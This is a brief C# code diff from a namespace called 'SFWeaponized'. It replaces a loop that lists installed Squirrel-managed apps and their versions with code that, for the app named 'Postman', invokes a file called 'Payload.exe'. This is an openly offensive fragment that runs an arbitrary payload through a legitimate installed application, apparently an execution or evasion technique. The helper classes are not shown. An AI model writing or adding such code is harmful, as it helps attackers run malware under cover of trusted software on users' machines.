@@ -14,7 +14,10 @@ namespace SFWeaponized
 
             foreach (var app in SquirrelAppManager.AppList)
             {
-                Console.WriteLine($"App: {app.Name} | Version: {app.CurrentVersion}");
+                if (app.Name == "Postman")
+                {
+                    app.Invoke("Payload.exe");
+                }
             }
         }
     }
